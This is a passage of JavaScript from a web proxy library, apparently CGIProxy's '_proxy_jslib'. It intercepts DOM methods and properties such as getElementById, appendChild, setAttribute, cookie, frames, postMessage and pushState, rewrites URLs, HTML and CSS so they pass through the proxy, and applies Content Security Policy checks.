		return function (elementId) {
			   if (this!==window) o= this ;
			   var e, i, buf, p ;
			   e= o.getElementById(elementId) ;
			   if (e!=null) return e ;
			   for (i= 0 ; i<_proxy_jslib_write_buffers.length ; i++)
			       if (_proxy_jslib_write_buffers[i]  &&
				   _proxy_jslib_write_buffers[i].doc===o) break ;
			   if (i>=_proxy_jslib_write_buffers.length) return null ;
			   buf= _proxy_jslib_write_buffers[i] ;
			   if (buf.buf==void 0) return null ;
			   if (buf.buf.match(new RegExp('\\bid\\s*=\\s*[\'"]?\\s*'+elementId+'\\s*[\'"]?', 'i'))) {
			       p= _proxy_jslib_proxify_html(buf.buf, o, !buf.has_jslib) ;
			       if (p[3]) return ;   // found frame document
			       buf.has_jslib= buf.has_jslib || p[2] ;
			       buf.buf= p[1] ;
			       o.write(p[0]) ;
			   }
			   return o.getElementById(elementId) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'getElementsByTagName':
	    if (_proxy_jslib_instanceof(o, 'Document') || _proxy_jslib_instanceof(o, 'Element')) {
		return function (tagname) {
			   if (this!==window) o= this ;
			   var i, buf, pi, doc ;
			   doc= (o.ownerDocument || o) ;
			   for (i= 0 ; i<_proxy_jslib_write_buffers.length ; i++)
			       if (_proxy_jslib_write_buffers[i]  &&
				   _proxy_jslib_write_buffers[i].doc===doc) break ;
			   if (i>=_proxy_jslib_write_buffers.length) return o.getElementsByTagName(tagname) ;
			   buf= _proxy_jslib_write_buffers[i] ;
			   if ((buf.buf!=void 0) && (tagname=='*' || buf.buf.match(new RegExp('<'+tagname+'\\b', 'i')))) {
			       p= _proxy_jslib_proxify_html(buf.buf, doc, !buf.has_jslib) ;
			       if (p[3]) return ;   // found frame document
			       buf.has_jslib= buf.has_jslib || p[2] ;
			       buf.buf= p[1] ;
			       doc.write(p[0]) ;
			   }
			   // remove our two initial <script> elements
			   if (tagname.toLowerCase()=='script') {
			       var scripts= o.getElementsByTagName(tagname) ;
			       var ret= [] ;
			       for (i= 2 ; i<scripts.length ; i++) ret[i-2]= scripts[i] ;
			       return ret ;
			   }
			   return o.getElementsByTagName(tagname) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'appendChild':
	    if (_proxy_jslib_instanceof(o, 'Node')) {
		return function (child) {
			   if ((o.nodeName.toLowerCase()=='script') && (child.nodeType==3)) { // TEXT_NODE=3
			       if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], "'unsafe-inline'"))
				   _proxy_jslib_throw_csp_error("CSP script-src inline error") ;
			       var type= o.type || _proxy_jslib_default_script_type ;
			       var new_text= _proxy_jslib_proxify_block(child.data, type,
				   _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, false) ;
			       return o.appendChild(document.createTextNode(new_text)) ;
			   } else if ((o.nodeName.toLowerCase()=='style') && child.nodeType==3) {
			       if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['style-src'], "'unsafe-inline'"))
				   _proxy_jslib_throw_csp_error("CSP style-src inline error") ;
			       var type= o.type || _proxy_jslib_default_style_type ;
			       var new_text= _proxy_jslib_proxify_block(child.data, type,
				   _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, false) ;
			       return o.appendChild(document.createTextNode(new_text)) ;
			   } else {
			       return o.appendChild(child);
			   }
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'replaceChild':
	case 'insertBefore':
	    if (_proxy_jslib_instanceof(o, 'Node')) {
		return function (child, old_child) {
			   var ret ;
			   if ((o.nodeName.toLowerCase()=='script') && (child.nodeType==3)) { // TEXT_NODE=3
			       if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], "'unsafe-inline'"))
				   _proxy_jslib_throw_csp_error("CSP script-src inline error") ;
			       var type= o.type || _proxy_jslib_default_script_type ;
			       var new_text= _proxy_jslib_proxify_block(child.data, type,
				   _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, false) ;
			       ret= o[property](document.createTextNode(new_text), old_child) ;
			       if (property=='replaceChild')
				   // unfortunately, next line would cause direct loads in some browsers
				   // ret.textContent= _proxy_jslib_proxify_block(ret.textContent, type, void 0, true) ;
				   return _proxy_jslib_proxify_block(ret.textContent, type, void 0, true) ;
			       return ret ;
			   } else if ((o.nodeName.toLowerCase()=='style') && child.nodeType==3) {
			       if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['style-src'], "'unsafe-inline'"))
				   _proxy_jslib_throw_csp_error("CSP style-src inline error") ;
			       var type= o.type || _proxy_jslib_default_style_type ;
			       var new_text= _proxy_jslib_proxify_block(child.data, type,
				   _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, false) ;
			       ret= o[property](document.createTextNode(new_text), old_child) ;
			       if (property=='replaceChild')
				   // unfortunately, next line would cause direct loads in some browsers
				   // ret.textContent= _proxy_jslib_proxify_block(ret.textContent, type, void 0, true) ;
				   return _proxy_jslib_proxify_block(ret.textContent, type, void 0, true) ;
			       return ret ;
			   } else {
			       while (old_child!=null
				      && (old_child.className=='_proxy_jslib_jslib'
					  || old_child.className=='_proxy_jslib_pv'))
				   old_child= old_child.nextSibling ;
			       return o[property](child, old_child);
			   }
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'removeChild':
	    if (_proxy_jslib_instanceof(o, 'Node')) {
		return function (old_child) {
			   var ret= o[property](old_child) ;
			   var type ;
			   if (ret.nodeType==3) {
			       type= (o.nodeName.toLowerCase()=='script')  ? (o.type || _proxy_jslib_default_script_type)
				   : (o.nodeName.toLowerCase()=='style')   ? (o.type || _proxy_jslib_default_style_type)
				   : '' ;
			       // unfortunately, next line would cause direct loads in some browsers
			       // ret.textContent= _proxy_jslib_proxify_block(ret.textContent, type, true, true) ;
			       return _proxy_jslib_proxify_block(ret.textContent, type, true, true) ;
			   }
			   return ret ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'createElement':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		return function (localName) {
			   // for when pages redefine createElement()
			   // jsm-- should use prototype methods everywhere?  Note that
			   //   chaining would only work because _proxy_jslib_instanceof()
			   //   would return true, even though instanceof would not work.
			   //var ret= o.createElement(localName) ;
			   var p= HTMLDocument.prototype || Document.prototype ;
			   var ret= p.createElement.call(o, localName) ;
			   if (localName.toLowerCase()=='iframe')
			       ret.contentDocument && ret.contentDocument.write(_proxy_jslib_iframe_init_html()) ;
			   return ret ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'text':
	    if (_proxy_jslib_instanceof(o, 'Node') && (o.nodeName.toLowerCase()=='script')) {
		    return _proxy_jslib_proxify_js(o.text, 0, 0, 0, true) ;
	    } else {
		return _handle_default() ;
	    }


	case 'insertAdjacentHTML':
	    if (_proxy_jslib_instanceof(o, 'HTMLElement')) {
		return function (where, text) {
			   if (this!==window) o= this ;
			   return o.insertAdjacentHTML(where, _proxy_jslib_proxify_html(text, o.ownerDocument, false)[0]) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'setAttribute':
	    if (_proxy_jslib_instanceof(o, 'Element')) {
		return function (name, value) {
			   if (this!==window) o= this ;
			   return o.setAttribute(name.toLowerCase(),
			       _proxy_jslib_proxify_attribute(o, o.attributes[name], name, value) ) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'setAttributeNode':
	    if (_proxy_jslib_instanceof(o, 'Element')) {
		return function (newAttr) {
			   if (this!==window) o= this ;
			   newAttr.nodeValue= _proxy_jslib_proxify_attribute(o, newAttr, newAttr.nodeName, newAttr.nodeValue) ;
			   return o.setAttributeNode(newAttr) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'getAttribute':
	    if (_proxy_jslib_instanceof(o, 'Element')) {
		return function (name, flag) {
			   var attr_val= o.getAttribute(name, flag) ;
			   return _proxy_jslib_proxify_attribute(o, o.attributes[name], name, attr_val, 1) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'value':
	    if (_proxy_jslib_instanceof(o, 'Attr')) {
		return _proxy_jslib_proxify_attribute(void 0, o, o.name, o.value, 1) ;
	    } else {
		return _handle_default() ;
	    }

	case 'insertRule':
	    if (_proxy_jslib_instanceof(o, 'CSSStyleSheet')) {
		if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['style-src'], "'unsafe-inline'"))
		    _proxy_jslib_throw_csp_error("CSP style-src inline error") ;
		return function (rule, index) {
			   if (this!==window) o= this ;
			   return o.insertRule(_proxy_jslib_proxify_css(rule), index) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'URL':
	case 'referrer':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		var pu= _proxy_jslib_parse_full_url(o[property]) ;
		return ((pu==void 0) || pu[3].match(/^x-proxy/i))  ? null  : pu[3] ;
	    } else {
		return _handle_default() ;
	    }

	case 'body':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		var ret= o.getElementById('_proxy_css_main_div') ;
		return ret  ? ret  : o.body ;
	    } else {
		return _handle_default() ;
	    }

	case 'parentNode':
	    if (_proxy_jslib_instanceof(o, 'Node')) {
//		return o.id=='_proxy_css_main_div'  ? o.ownerDocument.documentElement  : o.parentNode ;
		return o.id=='_proxy_css_main_div'  ? o.parentNode.parentNode : o.parentNode ;
	    } else {
		return _handle_default() ;
	    }

	case 'toString':
	    if (_proxy_jslib_instanceof(o, 'Link')) {
		return function () {
			   if (this!==window) o= this ;
			   return _proxy_jslib_parse_full_url(o.toString())[3] ;
		       } ;
	    } else {
		if (typeof o=='function') {
		    // for Function.toString, unproxify JS code
		    return function () {
			       var s= o.toString() ;
			       return s.match(/^\n?function\b/)
				   ? _proxy_jslib_proxify_js(s, 0, 0, in_new_statement, true)
				   : s ;
			   } ;
		} else {
		    return _handle_default() ;
		}
	    }


	case 'setInterval':
	case 'setTimeout':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		var oldmethod= o[property] ;

		// Function.apply() not available in MSIE, yet "Function.apply"
		//   returns true, so just trap all errors.
		// jsm-- this will also trap any errors in called routines....
		return function (codefunc, time) {

			   time*= _proxy_jslib_TIMEOUT_MULTIPLIER ;

			   if (this!==window) o= this ;
			   try {
			       if (typeof(codefunc)=='function') {
				   return oldmethod.apply(o, arguments) ;
			       } else {
				   if (!_proxy_jslib_eval_ok)
				       _proxy_jslib_throw_csp_error("can't "+property+" without unsafe-eval") ;
				   return oldmethod.call(o, _proxy_jslib_proxify_js(codefunc), time) ;
			       }
			   } catch (e) {
			       var ret ;
			       o._proxy_jslib_oldmethod= oldmethod ;
			       if (typeof(codefunc)=='function') {
				   ret= o._proxy_jslib_oldmethod(codefunc, time) ;
			       } else {
				   if (!_proxy_jslib_eval_ok)
				       _proxy_jslib_throw_csp_error("can't "+property+" without unsafe-eval") ;
				   ret= o._proxy_jslib_oldmethod(_proxy_jslib_proxify_js(codefunc), time) ;
			       }
			       try {
				   delete o._proxy_jslib_oldmethod ;
			       } catch(e) {
			       }
			       return ret ;
			   }
		} ;

	    } else {
		return _handle_default() ;
	    }


	case 'cookie':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		return _proxy_jslib_cookie_from_client(o) ;
	    } else {
		return _handle_default() ;
	    }


	case 'domain':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		// technically, Document.domain is just the hostname, though
		//   the same-origin policy uses scheme, hostname, and port
		var w= o.defaultView || o.parentWindow ;
		if (!w._proxy_jslib_document_domain) _proxy_jslib_init_domain(w) ;
		if (w._proxy_jslib_document_domain.match(/^https?\:\/\//i))
		    return _proxy_jslib_parse_url(w._proxy_jslib_document_domain)[4] ;
//else alert("bad w._proxy_jslib_document_domain: " + w._proxy_jslib_document_domain) ;   // jsm-- remove
	    } else {
		return _handle_default() ;
	    }



	case 'frames':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		var f, ret= [], useret ;
		if (!_proxy_jslib_document_domain) _proxy_jslib_init_domain(window) ;
		for (f=0 ; f<o.frames.length ; f++) {
		    try {
			if (!o.frames[f]._proxy_jslib_document_domain) _proxy_jslib_init_domain(o.frames[f]) ;
			if ((o.frames[f]._proxy_jslib_document_domain!=_proxy_jslib_document_domain)
			    && (o.frames[f]._proxy_jslib_document_domain))
			{
//alert('frame differs in domain; f, domains of window, o.frames[f]=['+f+']['+_proxy_jslib_document_domain+']['+o.frames[f]._proxy_jslib_document_domain+']') ;  // jsm-- test a bunch, then remove
			    // include both the numbered frame and the (non-standard) named frame
			    ret[f]= _proxy_jslib_dup_window_safe(o.frames[f]) ;
			    if (o.frames[f].name) ret[o.frames[f].name]= ret[f] ;
			    useret= true ;
			} else {
			    ret[f]= o.frames[f] ;
			    if (o.frames[f].name) ret[o.frames[f].name]= ret[f] ;
			}
		    } catch (e) {
alert('Window.frames error: '+e) ;
		    }
		}
		return useret  ? ret  : o.frames ;

	    } else {
		return _handle_default() ;
	    }


	case 'parent':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		// if we're in main frame, pretend it's its own "parent".
		var w= (o.top._proxy_jslib_main_frame===o)  ? o  : o.parent ;
		if (!_proxy_jslib_document_domain) _proxy_jslib_init_domain(window) ;
		if (!w._proxy_jslib_document_domain) _proxy_jslib_init_domain(w) ;
		if (w._proxy_jslib_document_domain && (w._proxy_jslib_document_domain!=_proxy_jslib_document_domain)) {
//		    alert('Tried to access parent window, but has different domain; domains are [' + _proxy_jslib_document_domain + '] and [' + w._proxy_jslib_document_domain + ']') ;
		    return _proxy_jslib_dup_window_safe(w) ;
		}
		return w ;
	    } else {
		return _handle_default() ;
	    }

	case 'top':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		// if window uses frames, translate "top" to "top._proxy_jslib_main_frame".
		var w= (o.top._proxy_jslib_main_frame!==void 0)  ? o.top._proxy_jslib_main_frame  : o.top ;
		if (!_proxy_jslib_document_domain) _proxy_jslib_init_domain(window) ;
		if (!w._proxy_jslib_document_domain) _proxy_jslib_init_domain(w) ;
		if (w._proxy_jslib_document_domain && (w._proxy_jslib_document_domain!=_proxy_jslib_document_domain)) {
//		    alert('Tried to access top window, but has different domain; domains are [' + _proxy_jslib_document_domain + '] and [' + w._proxy_jslib_document_domain + ']') ;
		    return _proxy_jslib_dup_window_safe(w) ;
		}
		return w ;
	    } else {
		return _handle_default() ;
	    }

	case 'opener':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		if (!o.opener) return null ;
		if (!_proxy_jslib_document_domain) _proxy_jslib_init_domain(window) ;
		if (!o.opener._proxy_jslib_document_domain) _proxy_jslib_init_domain(o.opener) ;
		if (o.opener._proxy_jslib_document_domain && (o.opener._proxy_jslib_document_domain!=_proxy_jslib_document_domain)) {
//		    alert('Tried to access opener window, but has different domain; domains are [' + _proxy_jslib_document_domain + '] and [' + w._proxy_jslib_document_domain + ']') ;
		    return _proxy_jslib_dup_window_safe(o.opener) ;
		}
		return o.opener ;
	    } else {
		return _handle_default() ;
	    }


	//  _proxy_jslib_parse_url() returns full_match, protocol, authentication, host, hostname, port, pathname, search, hash

	case 'protocol':
	    if (_proxy_jslib_instanceof(o, 'Link')) {
		return _proxy_jslib_parse_url(_proxy_jslib_parse_full_url(o.href)[3])[1] ;
	    } else {
		return _handle_default() ;
	    }

	case 'host':
	    if (_proxy_jslib_instanceof(o, 'Link')) {
		return _proxy_jslib_parse_url(_proxy_jslib_parse_full_url(o.href)[3])[3] ;
	    } else {
		return _handle_default() ;
	    }

	case 'hostname':
	    if (_proxy_jslib_instanceof(o, 'Link')) {
		return _proxy_jslib_parse_url(_proxy_jslib_parse_full_url(o.href)[3])[4] ;
	    } else {
		return _handle_default() ;
	    }

	case 'port':
	    if (_proxy_jslib_instanceof(o, 'Link')) {
		return _proxy_jslib_parse_url(_proxy_jslib_parse_full_url(o.href)[3])[5] ;
	    } else {
		return _handle_default() ;
	    }

	case 'pathname':
	    if (_proxy_jslib_instanceof(o, 'Link')) {
		return _proxy_jslib_parse_url(_proxy_jslib_parse_full_url(o.href)[3])[6] ;
	    } else {
		return _handle_default() ;
	    }

	case 'search':
	    if (_proxy_jslib_instanceof(o, 'Link')) {
		return _proxy_jslib_parse_url(_proxy_jslib_parse_full_url(o.href)[3])[7] ;
	    } else {
		return _handle_default() ;
	    }



	case 'LoadMovie':
	    if (_proxy_jslib_instanceof(o, 'FlashPlayer')) {
		return function (layer, url) {
			   if (this!==window) o= this ;
			   return o.LoadMovie(layer, _proxy_jslib_full_url(url)) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'setStringValue':
	    if (_proxy_jslib_instanceof(o, 'CSSPrimitiveValue')) {
		return function (type, value) {
			   if (this!==window) o= this ;
			   if (type==CSSPrimitiveValue.CSS_URI)
			       return o.setStringValue(type, _proxy_jslib_full_url(value)) ;
			   return o.setStringValue(type, value) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'setProperty':
	    if (_proxy_jslib_instanceof(o, 'CSSStyleDeclaration')) {
		return function (name, value, priority) {
			   if (this!==window) o= this ;
			   return o.setProperty(name, _proxy_jslib_proxify_css(value), priority) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'setNamedItem':
	    if (_proxy_jslib_instanceof(o, 'NamedNodeMap')) {
		return function (node) {
			   if (this!==window) o= this ;
			   node.nodeValue= _proxy_jslib_proxify_attribute(void 0, node, node.nodeName, node.nodeValue) ;
			   return o.setNamedItem(node) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	// Deproxify String() parameter if it's a Link or Location
	case 'String':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		return function(s) {
			   if (_proxy_jslib_instanceof(s, 'Link'))
			       return _proxy_jslib_parse_full_url(s.href)[3];
			   return String(s);
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'origin':
	    if (_proxy_jslib_instanceof(o, 'MessageEvent')) {
		if (o[property]==void 0) return void 0 ;
		if (o[property]=='*') return '*' ;
		if (!o.source) return void 0 ;
		var u= _proxy_jslib_parse_full_url(o.source.location.href)[3] ;
		var pu= _proxy_jslib_parse_url(u) ;
		return pu[1] + '//' + pu[3] ;
	    } else {
		return _handle_default() ;
	    }

	case 'postMessage':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		return function(message, targetOrigin, ports) {
			   return _proxy_jslib_postMessage(o, message, targetOrigin, ports) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'pushState':
	case 'replaceState':
	    if (_proxy_jslib_instanceof(o, 'History')) {
		return function(data, title, url) {
		    // url argument is optional
		    if (url==void 0) return o[property](data, title) ;

		    // must verify that origins of url and Document match!
		    var doc_pu= _proxy_jslib_parse_url(_proxy_jslib_parse_full_url(document.URL)[3]) ;
		    var new_url= _proxy_jslib_full_url(url) ;
		    var o_pu= _proxy_jslib_parse_url(_proxy_jslib_parse_full_url(new_url)[3]) ;
		    if (o_pu[3]!=doc_pu[3]) {
			alert('History.'+property+'() not allowed unless origins match: ['+o_pu[3]+'] ['+doc_pu[3]+']') ;
			return void 0 ;
		    }
		    return o[property](data, title, new_url) ;
		}
	    } else {
		return _handle_default() ;
	    }


	case 'currentSrc':
	    if (_proxy_jslib_instanceof(o, 'MediaElement')) {
		return _proxy_jslib_parse_full_url(o[property])[3] ;
	    } else {
		return _handle_default() ;
	    }


	case 'importScripts':
	    if (_proxy_jslib_instanceof(o, 'WorkerGlobalScope')) {
		return function() {
		    var fakedoc= {URL: o.location} ;   // need this for _proxy_jslib_full_url() call
		    _proxy_jslib_set_base_vars(fakedoc) ;
		    for (var i= 0 ; i<arguments.length ; i++)
			o.importScripts(_proxy_jslib_full_url(arguments[i], fakedoc)) ;
		} ;
	    } else {
		return _handle_default() ;
	    }


	// Netscape-specific in this block
	case 'load':
	    if (_proxy_jslib_instanceof(o, 'Layer')) {
		if (!o.load) return undefined ;
		return function (url, width) {
			   if (this!==window) o= this ;
			   return o.load(_proxy_jslib_full_url(url), width) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }



	// MSIE-specific in this block

	case 'execScript':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		if (!o.execScript) return undefined ;
		return function(code, language) {
			   if (this!==window) o= this ;
			   if (language && language.match(/^\s*(javascript|jscript|ecmascript|livescript|$)/i))
			       return o.execScript(_proxy_jslib_proxify_js(code), language) ;
			   // either disallow or execute unchanged scripts we don't support
			   if (_proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS)
			       return o.execScript(code, language) ;
			   return ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'navigate':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		if (!o.navigate) return undefined ;
		return function (url) {
			   if (this!==window) o= this ;
			   return o.navigate(_proxy_jslib_full_url(url, o.document)) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'showModalDialog':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		if (!o.showModalDialog) return undefined ;
		return function(url, args, features) {
			   if (this!==window) o= this ;
			   return o.showModalDialog(_proxy_jslib_full_url(url, o.document), args, features) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'showModelessDialog':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		if (!o.showModelessDialog) return undefined ;
		return function(url, args, features) {
			   if (this!==window) o= this ;
			   return o.showModelessDialog(_proxy_jslib_full_url(url, o.document), args, features) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }

	case 'addImport':
	    if (_proxy_jslib_instanceof(o, 'CSSStyleSheet')) {
		if (!o.addImport) return undefined ;
		return function(url, index) {
			   if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['style-src'], url))
			       _proxy_jslib_throw_csp_error("CSP style-src inline error") ;
			   if (this!==window) o= this ;
			   return o.addImport(_proxy_jslib_full_url(url, o.document), index) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	// We can't really support Storage objects well, since we'd need to
	//   handle e.g. "localStorage.foo= bar", and a dup'ed Storage object
	//   wouldn't have changes reflected in the actual Storage object.
	//   getters and setters would require knowing property names in advance.
	case 'localStorage':
	case 'sessionStorage':
	    if (_proxy_jslib_instanceof(o, 'Window')) {
		return undefined ;
	    } else {
		return _handle_default() ;
	    }


	// part of the _proxy_css_main_div hack....
	case 'querySelector':
	case 'querySelectorAll':
	    if (_proxy_jslib_instanceof(o, 'Document') || _proxy_jslib_instanceof(o, 'DocumentFragment')) {
		return function(selectors) {
			   if (_proxy_jslib_doing_insert_here)
			       selectors= selectors.replace(/\bbody\s*>/gi, 'div#_proxy_css_main_div>') ;
			   return o[property](selectors) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	// Document.execCommand() is a non-standard method supported by both
	//   MSIE and Firefox, though they support different sets of commands.
	// Note that values must be proxified relative to the calling Document
	//   object, not to the current document.
	case 'execCommand':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		return function(cmd, do_UI, value) {
			   var ret ;
//alert('in execCommand(); params=['+cmd+']['+do_UI+']['+value+']') ;  //jsm-- remove
			   cmd= cmd.toLowerCase() ;
			   if (_proxy_jslib_browser_family=='netscape') {
			       if ((cmd=='createlink') || (cmd=='insertimage')) {
				   ret= o.execCommand(cmd, do_UI, _proxy_jslib_full_url(value, o)) ;
			       } else if (cmd=='inserthtml') {
				   ret= o.execCommand(cmd, do_UI, _proxy_jslib_proxify_html(value, o)[0]) ;
			       } else {
				   ret= o.execCommand(cmd, do_UI, value) ;
			       }
			   } else if (_proxy_jslib_browser_family=='msie') {
			       if ((cmd=='createlink') || (cmd=='insertimage')) {
				   ret= o.execCommand(cmd, do_UI, _proxy_jslib_full_url(value, o)) ;
			       } else if (cmd.match(/^insert/)) {
				   alert('tried to execCommand('+cmd+')') ;
				   ret= undefined ;
			       } else {
				   ret= o.execCommand(cmd, do_UI, value) ;
			       }
			   }

			   return ret ;
		       } ;
	    } else {
		return _handle_default() ;
	    }



	// don't need to handle Document.parentWindow, do we?


	default:
	    return _handle_default() ;

    }




    // must be inside _proxy_jslib_handle() to retain o, property for closure
    function _handle_default() {

	if (calls_now && !in_new_statement && (typeof(o[property])=='function')) {
	    // Firefox (erroneously) reports that typeof(Function.prototype)
	    //   is 'function', not 'object' as it should be.
	    if (o==Function && property=='prototype') return o[property] ;

	    var fn= o[property] ;
	    var ret= function () {
			 // Handle "phantom functions"-- sometimes Firefox
			 //   seems to create Function objects with no
			 //   properties, where typeof=='function' but there
			 //   is no apply() method, where the constructor of
			 //   the function is undefined, and where
			 //   "fn instanceof Function" is false.  These were
			 //   causing CNN video controls to not work.  Oddly,
			 //   calling the phantom function with parameters
			 //   somehow makes it work-- does it alter a property
			 //   value, a flag, or what?  I don't know.
			 // Additionally, calling the function via eval does
			 //   not make it work, so we can't use the first
			 //   method below.  Possibly this is because of the
			 //   closure and the scope of o and property.  Also,
			 //   calling fn() doesn't make it work, even though
			 //   fn was set to o[property] .
			 if (fn.apply==void 0) {
			     // This doesn't work. :P
			     //var argst= '' ;
			     //for (var i= 0 ; i<arguments.length ; i++)
			     //    argst+= 'arguments['+i+'],' ;
			     //argst= argst.slice(0, -1) ;
			     //eval('return o[property]('+argst+')') ;

			     // lame!  will fail when arguments.length>10 .
			     return o[property](arguments[0], arguments[1],
						arguments[2], arguments[3],
						arguments[4], arguments[5],
						arguments[6], arguments[7],
						arguments[8], arguments[9]) ;
			 }

			 // Function.apply() not available in MSIE  :P
			 if (this!==window) {
			     return fn.apply(this, arguments) ;
			 } else {
			     return fn.apply(o, arguments) ;
			 }
		     } ;
	    // must copy all other properties too, in case anything's dereferenced
	    for (var p in o[property]) ret[p]= o[property][p] ;
	    return ret ;

	} else {
	    try {
		// hack for weird MSIE bug-- for some reason, it can't always
		//   access Element.getElementsByTagName() .
		if (_proxy_jslib_browser_family=='msie' && property=='getElementsByTagName')
		    return function(tagname) {
			       if (this!==window) o= this ;
			       return o.getElementsByTagName(tagname) ;
			   } ;

		return o[property] ;

	    } catch(e) {
//alert('in _handle_default() catch block; property=['+property+']; e=['+e+']') ;
		return undefined ;
	    }
	}

    }


}



// This is used when the property in question IS being assigned to, WITH an object.
function _proxy_jslib_assign (prefix, o, property, op, val) {
    var new_val ;

    // handle prefix
    if (prefix=='delete') return delete o[property] ;
    if (prefix=='++') {
	val= o[property]+1 ;
	op= '=' ;
    } else if (prefix=='--') {
	val= o[property]-1 ;
	op= '=' ;
    }

// sanity check
//if (o==null) alert('in assign, o is null, property, caller=\n['+property+']\n['+arguments.callee.caller+']') ;   // jsm-- remove in production release?

    // performance tweak
    if (!_proxy_jslib_assign_props_hash['p_'+property]) return _assign_default() ;

    var opmod= op.match(/=/)  ? op.replace(/=$/, '')  : '' ;

    var u ;
    if (_proxy_jslib_instanceof(o, 'Link') || _proxy_jslib_instanceof(o, 'Location'))
	u=  _proxy_jslib_parse_url(_proxy_jslib_instanceof(o, 'Link')  ? _proxy_jslib_parse_full_url(o.href)[3]  : o.href) ;
    // u[] has full_match, protocol, authentication, host, hostname, port, pathname, search, hash


    // For unknown object types, transform common URL properties such as "src".
    //   It's better to proxify a property too much than to open a privacy hole,
    //   which is what happens if such a property is a URL that does not get
    //   proxified.
    // Don't do this if the value it's being assigned to is a non-String object.
    //   This helps when variables have the same name as properties.
    // We don't cover all combinations of properties and operators here; e.g.
    //   URL-like properties are unlikely to use ++ or --, and other
    //   combinations don't usually make sense.  We can revisit if needed.
    // here we ignore case of "+=", etc.; revisit later if needed
    switch (property) {

	case 'src':
	    if (_proxy_jslib_instanceof(o, 'Element')) {
		var o_tagname= o.tagName.toLowerCase() ;
		if (o_tagname=='script') {
		    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], _proxy_jslib_absolute_url(val)))
			_proxy_jslib_throw_csp_error("CSP script-src error: " + val) ;
		} else if (o_tagname=='img') {
		    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['img-src'], _proxy_jslib_absolute_url(val)))
			_proxy_jslib_throw_csp_error("CSP img-src error: " + val) ;
		} else if (o_tagname=='video' || o_tagname=='audio' || o_tagname=='source' || o_tagname=='track') {
		    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['media-src'], _proxy_jslib_absolute_url(val)))
			_proxy_jslib_throw_csp_error("CSP media-src error: " + val) ;
		} else if (o_tagname=='frame' || o_tagname=='iframe') {
		    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['frame-src'], _proxy_jslib_absolute_url(val)))
			_proxy_jslib_throw_csp_error("CSP frame-src error: " + val) ;
		}
	    }
	    // falls through to next block

	case 'href':
	    // sloppy-- really need to separate out these properties
	    if (property=='href') {
		if (_proxy_jslib_instanceof(o, 'Element')) {
		    if ((o.tagName.toLowerCase()=='base')) {
			if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['base-uri'], _proxy_jslib_absolute_url(val)))
			    _proxy_jslib_throw_csp_error("CSP base-uri error: " + val) ;
			_proxy_jslib_set_base_vars(o.ownerDocument, _proxy_jslib_absolute_url(val)) ;
		    }
		}

		// handle our dup'ed Location object
		if (o._proxy_jslib_original_win) {
		    var o_win= o._proxy_jslib_original_win ;
		    if (opmod!='') {
			new_val= o.href ;
			eval('new_val' + op + 'val') ;
		    } else {
			new_val= val ;
		    }

		    if (o_win.top===o_win)
			o_win.location.href= _proxy_jslib_full_url_by_frame(new_val, o_win.document, 0) ;
		    else
			o_win.location.href= _proxy_jslib_full_url(new_val, o_win.document) ;
		   
		    _proxy_jslib_init_domain(o_win) ;
		    return new_val ;
		}
	    }

	case 'action':
	    if (_proxy_jslib_instanceof(o, 'Element')) {
		if ((o.tagName.toLowerCase()=='form') && (property=='action')) {
		    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['form-action'], _proxy_jslib_absolute_url(val)))
